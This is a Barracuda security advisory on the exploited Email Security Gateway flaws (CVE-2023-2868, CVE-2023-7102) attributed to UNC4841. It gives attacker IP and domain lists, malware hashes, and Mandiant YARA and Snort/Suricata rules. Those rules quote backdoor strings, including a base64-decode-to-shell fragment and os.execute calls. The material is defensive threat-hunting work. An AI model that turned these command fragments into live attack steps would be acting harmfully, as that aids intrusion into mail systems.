* [Microsoft Azure](https://www.barracuda.com/solutions/azure)

  Get security and networking solutions that are deployed natively in Microsoft Azure.
* [Google Cloud Platform (GCP)](https://www.barracuda.com/solutions/google-cloud)

  Check out our security products for Google Cloud Platform.

HOME / Resources
×

**Find Resources**

* [Resource Library](https://www.barracuda.com/resources/resource-library)
* [Data Sheets](https://www.barracuda.com/resources/resource-library?categoryId=3&fullMenu=category)
* [Case Studies](https://www.barracuda.com/resources/resource-library?categoryId=2&fullMenu=category)
* [Reports](https://www.barracuda.com/reports)
* [E-books](https://www.barracuda.com/resources/resource-library?categoryId=37&fullMenu=category)
* [Videos](https://www.barracuda.com/resources/resource-library?categoryId=20&fullMenu=category)

**Stay Informed**

* [Webinars and Events](https://www.barracuda.com/company/events)
* [News](https://www.barracuda.com/company/news)
* [Blog](https://blog.barracuda.com)
* [Cybersecurity Threat Index](https://www.barracuda.com/solutions/cyber-security-insights)
* [Threat Spotlight](https://blog.barracuda.com/category/research/threat-spotlight)
* [AI Cybersecurity Hub](https://www.barracuda.com/solutions/ai-in-cybersecurity)
* [Ransomware Protection Hub](https://www.barracuda.com/solutions/ransomware)
* [Cybersecurity Glossary](https://www.barracuda.com/support/glossary)

[All Resources
![]()](https://www.barracuda.com/resources)

[![CISO’s Guide to the Role of AI in Cybersecurity](/adobe/dynamicmedia/deliver/dm-aid--545c3a18-b9c1-4496-a44f-bc3a2b881b1f/ciso-guide-social-post.png?preferwebp=true&quality=95)](https://www.barracuda.com/reports/ai-cybersecurity-guide)

[**A CISO’s Guide to the Role of AI in Cybersecurity.**](https://www.barracuda.com/solutions/ransomware)

[Get the Report
![]()](https://www.barracuda.com/reports/ai-cybersecurity-guide)

HOME / Support
×

**Services**

* [Support Plans and Packages](https://www.barracuda.com/support/plans-and-packages)
* [Energize Updates](https://www.barracuda.com/support/energize-updates)
* [Instant Replacement](https://www.barracuda.com/support/instant-replacement)
* [Barracuda Campus Training](https://campus.barracuda.com/)

**Technical Information**

* [Documentation](https://campus.barracuda.com/interstitial/documentation)
* [Glossary](https://www.barracuda.com/support/glossary)
* [Barracuda Security Policies](https://www.barracuda.com/support/security)

**Quick Links**

* [Product Login](https://login.barracudanetworks.com/auth/login/)
* [Customer Support Login](https://barracudanetworks.force.com/customers/s)
* [Join the Barracuda Community](https://www.barracuda.com/support/join-community)
* [Contact Support](https://www.barracuda.com/support/contact)
* [Downloads](https://www.barracuda.com/support/download)
* [Free Trials](https://www.barracuda.com/support/free-trials)

HOME / Partners
×

* Existing Partners
* Become a Partner
* Find a Partner

Existing Partners
×

**Engage with Barracuda**

[Partner Portal Login](https://partners.barracuda.com/login)

**Partner Programs**

* [Program Overview](https://www.barracuda.com/partners)
* [Resale Partners](https://www.barracuda.com/partners/channel)
* [MSP Partners](https://www.barracuda.com/partners/msp)
* [Technology Partners](https://www.barracuda.com/partners/technology)
* [Partner SE Community](https://www.barracuda.com/partners/partner-se-community)

Become a Partner
×

**Become a Partner**

* [Program Overview](https://www.barracuda.com/partners)

  We are a trusted partner and leading provider of cloud-enabled security solutions. We listen closely to understand what’s most important to our partners and customers. Unlike any other security company, we provide solutions and support that grow and adapt to their journey. Grow your business, boost profits, and protect customers throughout their journey.
* [Partner Application Form](https://www.barracuda.com/partners/become-a-partner)

Find a Partner
×

**Find a Partner**

* By working with a Barracuda partner, you get the knowledge and expertise you need to find just the right products and solutions to protect and support your business. As an extension of the Barracuda sales and support organization, our partners provide you with hands-on guidance, service and support to help meet your IT-security needs.
* [Find a Partner](https://www.barracuda.com/partners/find)

HOME / Company
×

**Who We Are**

* [About Us](https://www.barracuda.com/company)
* [Leadership](https://www.barracuda.com/company/leadership)
* [Customers](https://www.barracuda.com/company/customers)
* [Barracuda Insiders](https://www.barracuda.com/company/customers/insider-program)
* [Careers](https://www.barracuda.com/company/careers)
* [Engineering](https://www.barracuda.com/company/engineering)

**News and Events**

* [News Room](https://www.barracuda.com/company/news)
* [Blog](https://blog.barracuda.com)
* [Industry Awards](https://www.barracuda.com/company/awards)
* [Webinars and Events](https://www.barracuda.com/company/events)
* [Webcast: Below the Surface](https://www.barracuda.com/company/news/below-the-surface)

**Legal**

* [Trust Center](https://www.barracuda.com/company/legal)
* [Privacy Policy](https://www.barracuda.com/company/legal/data-privacy/privacy-policy)
* [Legal Terms, Conditions, and Warranties](https://www.barracuda.com/company/legal/terms-and-conditions)
* [Supplier Terms](https://www.barracuda.com/company/legal/supplier-terms)

[Contact Sales
![]()](https://www.barracuda.com/company/contact)

Close

* [Home](https://www.barracuda.com)
* [Company](https://www.barracuda.com/company)
* [Legal](https://www.barracuda.com/company/legal)
* Barracuda Email Security Gateway Appliance (ESG) Vulnerability

2. [Home](https://www.barracuda.com)
3. [Company](https://www.barracuda.com/company)
4. [Legal](https://www.barracuda.com/company/legal)
5. Barracuda Email Security Gateway Appliance (ESG) Vulnerability

# Barracuda Email Security Gateway Appliance (ESG) Vulnerability

## We are committed to securing your data

## Barracuda Email Security Gateway Appliance (ESG) Vulnerability

JANUARY 4th, 2024:

On 12/29/2023, version 0.66 of  Spreadsheet::ParseExcel was published. This release fixes CVE-2023-7101.

<https://metacpan.org/dist/Spreadsheet-ParseExcel/changes>

For organizations utilizing Spreadsheet::ParseExcel in their own products or services, we recommend reviewing CVE-2023-7101 and upgrading to the latest version of Spreadsheet::ParseExcel.

DECEMBER 24th, 2023:

In our ongoing investigation, Barracuda has determined that a threat actor has utilized an Arbitrary Code Execution (ACE) vulnerability within a third party library, Spreadsheet::ParseExcel, to deploy a specially crafted Excel email attachment to target a limited number of ESG devices. Spreadsheet::ParseExcel is an open source library used by the Amavis virus scanner within the ESG appliance. Barracuda, working in collaboration with Mandiant, assesses this activity is attributable to continued operations of the China nexus actor tracked as [UNC4841](https://www.mandiant.com/resources/blog/unc4841-post-barracuda-zero-day-remediation).

On December 21, 2023, Barracuda deployed a security update to all active ESGs to address the ACE vulnerability in Spreadsheet::ParseExcel. The security update has been automatically applied, requiring no action by the customer.

Following [UNC4841](https://www.mandiant.com/resources/blog/unc4841-post-barracuda-zero-day-remediation)’s exploitation of the ACE vulnerability ([CVE-2023-7102](https://www.cve.org/CVERecord?id=CVE-2023-7102)), Barracuda has observed new variants of SEASPY and SALTWATER malware deployed to a limited number of ESG devices. On December 22, 2023, Barracuda deployed a patch to remediate compromised ESG appliances which exhibited indicators of compromise related to the newly identified malware variants.

No action is required by customers at this time, and our investigation is ongoing.

Barracuda has filed CVE-2023-7102 in relation to Barracuda’s use of Spreadsheet::ParseExcel which has been patched. In addition, in order to increase public awareness of the ACE vulnerability in Spreadsheet::ParseExcel, Barracuda has filed [CVE-2023-7101](https://www.cve.org/CVERecord?id=CVE-2023-7101). At the time of this update, there is no known patch or update available to remediate CVE-2023-7101 within the open source library. For organizations utilizing Spreadsheet::ParseExcel in their own products or services, we recommend reviewing CVE-2023-7101 and promptly taking necessary remediation measures.

To assist organizations with hunting activity related to this UNC4841 activity. Indicators of Compromise have been added to the IOC tables below.

**Current Indicators of Compromise (IOCs)**

Host IOCs

| Malware | MD5 Hash | SHA256 | File Name(s) | File Type |
| --- | --- | --- | --- | --- |
| CVE-2023-7102 XLS Document | 2b172fe3329260611a9022e71acdebca | 803cb5a7de1fe0067a9eeb220dfc24ca 56f3f571a986180e146b6cf387855bdd | ads2.xls | xls |
| CVE-2023-7102 XLS Document | e7842edc7868c8c5cf0480dd98bcfe76 | 952c5f45d203d8f1a7532e5b59af8e330 6b5c1c53a30624b6733e0176d8d1acd | don.xls | xls |
| CVE-2023-7102 XLS Document | e7842edc7868c8c5cf0480dd98bcfe76 | 952c5f45d203d8f1a7532e5b59af8e330 6b5c1c53a30624b6733e0176d8d1acd | personalbudget.xls | xls |
| SEASPY | 7b83e4bd880bb9d7904e8f553c2736e3 | 118fad9e1f03b8b1abe00529c61dc3edf da043b787c9084180d83535b4d177b7 | wifi-service | x-executable |
| SALTWATER | d493aab1319f10c633f6d223da232a27 | 34494ecb02a1cccadda1c7693c45666e1 fe3928cc83576f8f07380801b07d8ba | mod\_tll.so | x-sharedlib |

Network IOCs

| IP Address | ASN | Location |
| --- | --- | --- |
| 23.224.99.242 | 40065 | US |
| 23.224.99.243 | 40065 | US |
| 23.224.99.244 | 40065 | US |
| 23.224.99.245 | 40065 | US |
| 23.224.99.246 | 40065 | US |
| 23.225.35.234 | 40065 | US |
| 23.225.35.235 | 40065 | US |
| 23.225.35.236 | 40065 | US |
| 23.225.35.237 | 40065 | US |
| 23.225.35.238 | 40065 | US |
| 107.148.41.146 | 398823 | US |

AUGUST 29th, 2023:

Today, Mandiant published an updated blog post (<https://www.mandiant.com/resources/blog/unc4841-post-barracuda-zero-day-remediation>) which further analyzed the actions of the Chinese-nexus threat group tracked as [UNC4841](https://advantage.mandiant.com/actors/threat-actor--d891e056-7458-50e9-a03e-cd321b631202). As noted in the blog, Mandiant and Barracuda have not identified any newly compromised ESG appliances post release of a security patch on May 20, 2023.which remediated the zero day ESG vulnerability (CVE-2023-2868). Mandiant assesses a limited number of previously impacted victims that have not followed Barracuda’s guidance to replace their impacted appliances may still face risk associated with this.

Barracuda continues to recommend that impacted customers replace their compromised appliance. Only a limited number of ESG appliances worldwide were compromised and impacted customers have been notified to replace the appliances. Barracuda is providing the replacement product to impacted customers at no cost. No other Barracuda product, including Barracuda’s SaaS email solutions, were impacted by this vulnerability.

JULY 28th, 2023:

While our investigation is still ongoing, Barracuda in conjunction with Mandiant, analyzed the additional malware code named SUBMARINE by CISA in its report issued on July 28, 2023  ( <https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors>). This additional malware was utilized by the threat actor in response to Barracuda’s remediation actions in an attempt to create persistent access on customer ESG appliances. This malware appeared on a very small number of already compromised ESG appliances. Barracuda’s recommendation is unchanged.  Customers should discontinue use of the compromised ESG appliance and contact Barracuda support (support@barracuda.com) to obtain a new ESG virtual or hardware appliance.

JUNE 15th, 2023:

**Barracuda ESG Appliance Vulnerability Status Update**

While our investigation is still ongoing, Barracuda now has a more comprehensive understanding of the incident, including that exploitation occurred on a subset of compromised Barracuda Email Security Gateway (ESG) appliances by an aggressive and highly skilled actor conducting targeted activity which, as reported by Mandiant, has suspected links to China. Consistent with our previous updates, we are sharing additional technical details to support our customers and partners. We are also publishing additional indicators of compromise that organizations can leverage for their network defenses.

For more technical details on the Barracuda ESG Zero-Day Vulnerability (CVE-2023-2868), please read Mandiant’s blog at [https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally](https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"). Along with this blog post, Mandiant has produced detailed Hardening Recommendations to assist organizations with this event.

**Attribution**

Mandiant assessed with high confidence that the threat actor, identified as UNC4841, who exploited the ESG zero-day vulnerability conducted targeted information gathering activity from a subset of organizations in support of the People’s Republic of China.

Our priority throughout this incident has been transparency around what we know as well as the actions we’ve taken. As discussed in our guidance released on May 31, 2023, and reiterated on June 6, 2023, we recommend immediate replacement of compromised ESG appliances, regardless of patch level.

JUNE 15th, 2023:

**Current Indicators of Compromise (IOCs)**

Network IOCs

| IP Address | ASN | Netblock | Location |
| --- | --- | --- | --- |
| 101.229.146.218 | 4812 | China Telecom | CN |
| 103.146.179.101 | 136933 | Gigabitbank Global | HK |
| 103.27.108.62 | 132883 | Topway Global Limited | HK |
| 103.77.192.13 | 10222 | Multibyte Info Technology Limited | HK |
| 103.77.192.88 | 10222 | Multibyte Info Technology Limited | HK |
| 103.93.78.142 | 61414 | Edgenap Ltd | JP |
| 104.156.229.226 | 20473 | Choopa, LLC | US |
| 104.223.20.222 | 8100 | CloudVPS | US |
| 107.148.149.156 | 399195 | Pegtechinc-ap-04 | US |
| 107.148.219.227 | 54600 | Peg Tech | US |
| 107.148.219.53 | 54600 | Peg Tech | US |
| 107.148.219.54 | 54600 | Peg Tech | US |
| 107.148.219.55 | 54600 | Peg Tech | US |
| 107.148.223.196 | 54600 | Peg Tech | US |
| 107.173.62.158 | 20278 | Nexeon Technologies | US |
| 137.175.19.25 | 54600 | Peg Tech | US |
| 137.175.28.251 | 54600 | Peg Tech | US |
| 137.175.30.36 | 54600 | Peg Tech | US |
| 137.175.30.86 | 54600 | Peg Tech | US |
| 137.175.51.147 | 54600 | Peg Tech | US |
| 137.175.53.17 | 54600 | Peg Tech | US |
| 137.175.53.170 | 54600 | Peg Tech | US |
| 137.175.53.218 | 54600 | Peg Tech | US |
| 137.175.60.252 | 54600 | Peg Tech | US |
| 137.175.60.253 | 54600 | Peg Tech | US |
| 137.175.78.66 | 54600 | Peg Tech | US |
| 139.84.227.9 | 20473 | Choopa, LLC | ZA |
| 155.94.160.72 | 8100 | CloudVPS | US |
| 182.239.114.135 | 9231 | China Mobile Hong Kong | HK |
| 182.239.114.254 | 9231 | China Mobile Hong Kong | HK |
| 192.74.226.142 | 54600 | Peg Tech | CN |
| 192.74.254.229 | 54600 | Peg Tech | US |
| 198.2.254.219 | 54600 | Peg Tech | US |
| 198.2.254.220 | 54600 | Peg Tech | US |
| 198.2.254.221 | 54600 | Peg Tech | US |
| 198.2.254.222 | 54600 | Peg Tech | US |
| 198.2.254.223 | 54600 | Peg Tech | US |
| 199.247.23.80 | 20473 | Choopa, LLC | DE |
| 213.156.153.34 | 202422 | G-Core Labs S.A. | US |
| 216.238.112.82 | 20473 | Choopa, LLC | BR |
| 23.224.42.29 | 40065 | Cnservers LLC | US |
| 23.224.78.130 | 40065 | Cnservers LLC | US |
| 23.224.78.131 | 40065 | Cnservers LLC | US |
| 23.224.78.132 | 40065 | Cnservers LLC | US |
| 23.224.78.133 | 40065 | Cnservers LLC | US |
| 23.224.78.134 | 40065 | Cnservers LLC | US |
| 37.9.35.217 | 202422 | G-Core Labs S.A. | US |
| 38.54.113.205 | 138915 | Kaopu Cloud HK Limited | MY |
| 38.54.1.82 | 138915 | Kaopu Cloud HK Limited | SG |
| 38.60.254.165 | 174 | Cogent Communications | US |
| 45.63.76.67 | 20473 | Choopa, LLC | US |
| 52.23.241.105 | 14618 | Amazon.com | US |
| 64.176.4.234 | 20473 | Choopa, LLC | US |
| 64.176.7.59 | 20473 | Choopa, LLC | US |
| 23.224.99.246 | 33330,133131 |  | US |
| 23.225.35.236 | 33330,133131 |  | US |

| Domain |
| --- |
| bestfindthetruth.com |
| fessionalwork.com |
| gesturefavour.com |
| goldenunder.com |
| singamofing.com |
| singnode.com |
| togetheroffway.com |
| troublendsef.com |

Endpoint IOCs

| Filename | Hash | Type |
| --- | --- | --- |
| 0d67f50a0bf7a3a017784146ac41ada0 | snapshot.tar | Payload Attachment |
| 42722b7d04f58dcb8bd80fe41c7ea09e | 11111.tar | Payload Attachment |
| 5392fb400bd671d4b185fb35a9b23fd3 | imgdata.jpg | Payload Attachment |
| ac4fb6d0bfc871be6f68bfa647fc0125 | snapshot.tar | Payload Attachment |
| 878cf1de91f3ae543fd290c31adcbda4 | snapshot.tar | Payload Attachment |
| b601fce4181b275954e3f35b18996c92 | install\_reuse.tar | SALTWATER install |
| 827d507aa3bde0ef903ca5dec60cdec8 | mod\_udp.so | SALTWATER variant |
| c56d7b86e59c5c737ee7537d7cf13df1 | autoins | SALTWATER install |
| 6f79ef58b354fd33824c96625590c244 | intent\_reuse | SALTWATER install |
| 349ca242bc6d2652d84146f5f91c3dbb | intentbas | SALTWATER install |
| 1fea55b7c9d13d822a64b2370d015da7 | mod\_udp.so | SALTWATER variant |
| 64c690f175a2d2fe38d3d7c0d0ddbb6e | mod\_udp.so | SALTWATER variant |
| 4cd0f3219e98ac2e9021b06af70ed643 | mod\_udp.so | SALTWATER variant |
| 3b93b524db66f8bb3df8279a141734bb | mod\_rtf.so | SALTWATER variant |
| 8fdf3b7dc6d88594b8b5173c1aa2bc82 | mod\_rft.so | SALTWATER Variant |
| 4ec4ceda84c580054f191caa09916c68 | mod\_rft.so | SALTWATER variant |
| 1b1830abaf95bd5a44aa3873df901f28 | mod\_rft.so | SALTWATER variant |
| 4ca4f582418b2cc0626700511a6315c0 | BarracudaMailService | SEASPY Variant |
| c528b6398c86f8bdcfa3f9de7837ebfe | update\_v2.sh | SEASPY Install |
| 2d841cb153bebcfdee5c54472b017af2 | rc | SEASPY launcher |
| c979e8651c1f40d685be2f66e8c2c610 | rc | SEASPY launcher |
| 1c042d39ca093b0e7f1412453b132076 | rc | SEASPY launcher |
| ba7af4f98d85e5847c08cf6cefdf35dc | rc | SEASPY launcher |
| 82eaf69de710abdc5dea7cd5cb56cf04 | BarracudaMailService | SEASPY Variant |
| e80a85250263d58cc1a1dc39d6cf3942 | BarracudaMailService | SEASPY Variant |
| 5d6cba7909980a7b424b133fbac634ac | BarracudaMailService | SEASPY Variant |
| 1bbb32610599d70397adfdaf56109ff3 | BarracudaMailService | SEASPY Variant |
| 4b511567cfa8dbaa32e11baf3268f074 | BarracudaMailService | SEASPY Variant |
| a08a99e5224e1baf569fda816c991045 | BarracudaMailService | SEASPY Variant |
| 19ebfe05040a8508467f9415c8378f32 | BarracudaMailService | SEASPY Variant |
| 831d41ba2a0036540536c2f884d089f9 | sendscd | SEASPY Variant |
| db4c48921537d67635bb210a9cb5bb52 | BarracudaMailService | SEASPY Variant |
| 694cdb49879f1321abb4605adf634935 | install\_bvp74\_auth.tar | SEASPY install |
| 5fdee67c82f5480edfa54afc5a9dc834 | install\_bvp74\_auth.tar | SEASPY install |
| 8fc03800c1179a18fbd58d746596fa7d | update\_version | SEASPY launcher |
| 17696a438387248a12cc911fbae8620e | resize\_risertab | SEASPY launcher |
| 4c1c2db989e0e881232c7748593d291e | update\_version | SEASPY launcher |
| 3e3f72f99062255d6320d5e686f0e212 | update\_version | SEASPY launcher |
| 7d7fd05b262342a9e8237ce14ec41c3b | update\_version | SEASPY launcher |
| 2e30520f8536a27dd59eabbcb8e3532a | update\_version | SEASPY launcher |
| 0245e7f9105253ecb30de301842e28e4 | update\_version | SEASPY launcher |
| 0c227990210e7e9d704c165abd76ebe2 | update\_version | SEASPY launcher |
| c7a89a215e74104682880def469d4758 | update\_version | SEASPY launcher |
| 1bc5212a856f028747c062b66c3a722a | update\_version | SEASPY launcher |
| a45ca19435c2976a29300128dc410fd4 | update\_version | SEASPY launcher |
| 132a342273cd469a34938044e8f62482 | update\_version | SEASPY launcher |
| 23f4f604f1a05c4abf2ac02f976b746b | resize2fstab | SEASPY Variant |
| 45b79949276c9cb9cf5dc72597dc1006 | resize\_reisertab | SEASPY Variant |
| bef722484288e24258dd33922b1a7148 | resize2fstab | SEASPY Variant |
| 0805b523120cc2da3f71e5606255d29c | resize\_reisertab | SEASPY Variant |
| 69ef9a9e8d0506d957248e983d22b0d5 | resize2fstab | SEASPY Variant |
| 3c20617f089fe5cc9ba12c43c6c072f5 | resize2fstab | SEASPY Variant |
| 76811232ede58de2faf6aca8395f8427 | resize2fstab | SEASPY Variant |
| f6857841a255b3b4e4eded7a66438696 | resize\_reisertab | SEASPY Variant |
| 2ccb9759800154de817bf779a52d48f8 | install\_helo.tar | SEASIDE Install |
| cd2813f0260d63ad5adf0446253c2172 | mod\_require\_helo.lua | SEASIDE variant |
| 177add288b289d43236d2dba33e65956 | rverify | WHIRLPOOL VARIANT |
| 87847445f9524671022d70f2a812728f | mod\_content.lua | SKIPJACK |
| 35cf6faf442d325961935f660e2ab5a0 | mod\_attachment.lua | SEASPRAY |
| ce67bb99bc1e26f6cb1f968bc1b1ec21 | install\_att\_v2.tar | SEASPRAY install |
| e4e86c273a2b67a605f5d4686783e0cc | mknod | SKIPJACK Persistence |
| ad1dc51a66201689d442499f70b78dea | get\_fs\_info.pl | SKIPJACK Persistence |
| 9033dc5bac76542b9b752064a56c6ee4 | nfsd\_stub.ko | SANDBAR |
| e52871d82de01b7e7f134c776703f696 | rverify | WHIRLPOOL Variant |
| 446f3d71591afa37bbd604e2e400ae8b | mknod | SEASPRAY Persistence |
| 666da297066a2596cacb13b3da9572bf | mod\_sender.lua | SEASPRAY |
| 436587bad5e061a7e594f9971d89c468 | saslautchd | WHIRLPOOL Variant |
| 85c5b6c408e4bdb87da6764a75008adf | rverify | WHIRLPOOL Variant |
| 407738e565b4e9dafb07b782ebcf46b0 | test1.sh | Reverse shell cronjob |
| cb0f7f216e8965f40a724bc15db7510b | update\_v35.sh | Bash Script |
| N/A - multiple version identified | 1.sh | Bash Script |
| 19e373b13297de1783cecf856dc48eb0 | cl | proxy client |
| N/A | aacore.sh | reverse shell cronjob |
| N/A | appcheck.sh | reverse shell cronjob |
| 881b7846f8384c12c7481b23011d8e45 | update\_v31.sh | Bash Script |
| f5ab04a920302931a8bd063f27b745cc | intent\_helo | Bash Script |
| N/A | p | Named pipe used in reverse shell |
| N/A | p7 | Named pipe used in reverse shell |
| N/A | t | Named pipe used in reverse shell |
| N/A | core.sh | Reverse shell cronjob |
| N/A | p1 | Named pipe used in reverse shell |
| 177add288b289d43236d2dba33e65956 | pd | WHIRLPOOL Variant |
| N/A | b | Named pipe used in reverse shell |
| d098fe9674b6b4cb540699c5eb452cb5 | test.sh | Reverse shell cronjob |
| N/A | ss | Named pipe used in reverse shell |

Detection Rules

Yara

rule M\_Hunting\_Exploit\_Archive\_2

{

meta:

author = "Mandiant"

description = "Hunting rule looking for TAR archives with /tmp/ base64 encoded being part of filename of enclosed files"

md5 = "0d67f50a0bf7a3a017784146ac41ada0"

strings:

$ustar = { 75 73 74 61 72 }

$b64\_tmp = "/tmp/" base64

condition:

filesize < 1MB and

$ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_tmp in (i \* 512 .. i \* 512 + 250)

)

}

rule M\_Hunting\_Exploit\_Archive\_3

{

meta:

author = "Mandiant"

description = "Hunting rule looking for TAR archive with openssl base64 encoded being part of filename of enclosed files"

md5 = "0d67f50a0bf7a3a017784146ac41ada0"

strings:

$ustar = { 75 73 74 61 72 }

$b64\_openssl = "openssl" base64

condition:

filesize < 1MB and

$ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_openssl in (i \* 512 .. i \* 512 + 250)

)

}

rule M\_Hunting\_Exploit\_Archive\_CVE\_2023\_2868

{

meta:

author = "Mandiant"

description = "Hunting rule looking for TAR archive with single quote/backtick as start of filename of enclosed files. CVE-2023-2868"

md5 = "0d67f50a0bf7a3a017784146ac41ada0"

strings:

$ustar = { 75 73 74 61 72 }

$qb = "'`"

condition:

filesize < 1MB and

$ustar at 257 and

for any i in (0 .. #ustar) : (

$qb at (@ustar[i] + 255)

)

}

rule M\_Hunting\_Linux\_SALTWATER\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SALTWATER samples."

md5 = "827d507aa3bde0ef903ca5dec60cdec8"

strings:

$s1 = { 71 75 69 74 0D 0A 00 00 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

$s2 = { 00 8B D5 AD 93 B7 54 D5 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

$s3 = { 71 75 69 74 0D 0A 00 00 00 12 8D 03 07 9C 17 92 08 F0 0C 9A 01 06 08 00 1A 0C 0B 8D 18 0A 0D 0A }

condition:

uint32(0) == 0x464c457f and any of them

}

rule M\_Hunting\_Linux\_SALTWATER\_2

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SALTWATER samples."

md5 = "827d507aa3bde0ef903ca5dec60cdec8"

strings:

$c1 = "TunnelArgs"

$c2 = "DownloadChannel"

$c3 = "UploadChannel"

$c4 = "ProxyChannel"

$c5 = "ShellChannel"

$c6 = "MyWriteAll"

$c7 = "MyReadAll"

$c8 = "Connected2Vps"

$c9 = "CheckRemoteIp"

$c10 = "GetFileSize"

$s1 = "[-] error: popen failed"

$s2 = "/home/product/code/config/ssl\_engine\_cert.pem"

$s3 = "libbindshell.so"

condition:

uint32(0) == 0x464c457f and (any of ($s\*) or 4 of ($c\*))

}

rule FE\_Hunting\_Linux\_Funchook\_FEBeta

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in Funchook library - https://github.com/kubo/funchook"

md5 = "827d507aa3bde0ef903ca5dec60cdec8"

strings:

$f = "funchook\_"

$s1 = "Enter funchook\_create()"

$s2 = "Leave funchook\_create() => %p"

$s3 = "Enter funchook\_prepare(%p, %p, %p)"

$s4 = "Leave funchook\_prepare(..., [%p->%p],...) => %d"

$s5 = "Enter funchook\_install(%p, 0x%x)"

$s6 = "Leave funchook\_install() => %d"

$s7 = "Enter funchook\_uninstall(%p, 0x%x)"

$s8 = "Leave funchook\_uninstall() => %d"

$s9 = "Enter funchook\_destroy(%p)"

$s10 = "Leave funchook\_destroy() => %d"

$s11 = "Could not modify already-installed funchook handle."

$s12 = "  change %s address from %p to %p"

$s13 = "  link\_map addr=%p, name=%s"

$s14 = "  ELF type is neither ET\_EXEC nor ET\_DYN."

$s15 = "  not a valid ELF module %s."

$s16 = "Failed to protect memory %p (size=%"

$s17 = "  protect memory %p (size=%"

$s18 = "Failed to unprotect memory %p (size=%"

$s19 = "  unprotect memory %p (size=%"

$s20 = "Failed to unprotect page %p (size=%"

$s21 = "  unprotect page %p (size=%"

$s22 = "Failed to protect page %p (size=%"

$s23 = "  protect page %p (size=%"

$s24 = "Failed to deallocate page %p (size=%"

$s25 = " deallocate page %p (size=%"

$s26 = "  allocate page %p (size=%"

$s27 = "  try to allocate %p but %p (size=%"

$s28 = "  allocate page %p (size=%"

$s29 = "Could not find a free region near %p"

$s30 = "  -- Use address %p or %p for function %p"

condition:

uint32(0) == 0x464c457f and (#f > 5 or 4 of ($s\*))

}

rule M\_Hunting\_Linux\_SEASPY\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SEASPY samples."

md5 = "4ca4f582418b2cc0626700511a6315c0"

strings:

$s1 = "usage: ./BarracudaMailService <Network-Interface>. e.g.: ./BarracudaMailService eth0"

$s2 = "NO port code"

$s3 = "pcap\_lookupnet: %s"

$s4 = "Child process id:%d"

$s5 = "[\*]Success!"

$s6 = "enter open tty shell..."

condition:

uint32(0) == 0x464c457f and all of ($s\*)

}

//

// SEASIDE

//

rule M\_Hunting\_Lua\_SEASIDE\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SEASIDE samples."

md5 = "cd2813f0260d63ad5adf0446253c2172"

strings:

$s1 = "function on\_helo()"

$s2 = "local bindex,eindex = string.find(helo,'.onion')"

$s3 = "helosend = 'pd'..' '..helosend"

$s4 = "os.execute(helosend)"

condition:

(filesize < 1MB) and all of ($s\*)

}

rule M\_Hunting\_SKIPJACK\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SKIPJACK installation script."

md5 = "e4e86c273a2b67a605f5d4686783e0cc"

strings:

$str1 = "hdr:name() == 'Content-ID'" base64

$str2 = "hdr:body() ~= nil" base64

$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64

$str4 = "openssl aes-256-cbc" base64

$str5 = "mod\_content.lua"

$str6 = "#!/bin/sh"

condition:

all of them

}

rule M\_Hunting\_Lua\_SKIPJACK\_2

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SKIPJACK samples."

md5 = "87847445f9524671022d70f2a812728f"

strings:

$str1 = "hdr:name() == 'Content-ID'"

$str2 = "hdr:body() ~= nil"

$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"

$str4 = "openssl aes-256-cbc"

$str5 = "| base64 -d| sh 2>"

condition:

all of them

}

rule M\_Hunting\_Lua\_SEASPRAY\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in SEASPRAY samples."

md5 = "35cf6faf442d325961935f660e2ab5a0"

strings:

$str1 = "string.find(attachment:filename(),'obt075') ~= nil"

$str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())"

$str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())"

condition:

all of them

}

rule M\_Hunting\_Linux\_WHIRLPOOL\_1

{

meta:

author = "Mandiant"

description = "Hunting rule looking for strings observed in WHIRLPOOL samples."

md5 = "177add288b289d43236d2dba33e65956"

strings:

$s1 = "error -1 exit" fullword

$s2 = "create socket error: %s(error: %d)\n" fullword

$s3 = "connect error: %s(error: %d)\n" fullword

$s4 = {C7 00 20 32 3E 26 66 C7 40 04 31 00}

$c1 = "plain\_connect" fullword

$c2 = "ssl\_connect" fullword

$c3 = "SSLShell.c" fullword

condition:

filesize < 15MB and uint32(0) == 0x464c457f and (all of ($s\*) or all of ($c\*))

}

Snort/Suricata

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_oXmp"; flags:S; dsize:>9; content:"oXmp"; offset:0; depth:4; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000000; rev:1;)

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_TfuZ"; flags:S; dsize:>9; content:"TfuZ"; offset:0; depth:4; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000001; rev:1;)

Suricata >= 5.0.4

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_1358"; flags:S; tcp.hdr; content:"|05 4e|"; offset:22; depth:2; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000002; rev:1;)

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_58928"; flags:S; tcp.hdr; content:"|e6 30|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000003; rev:1;)

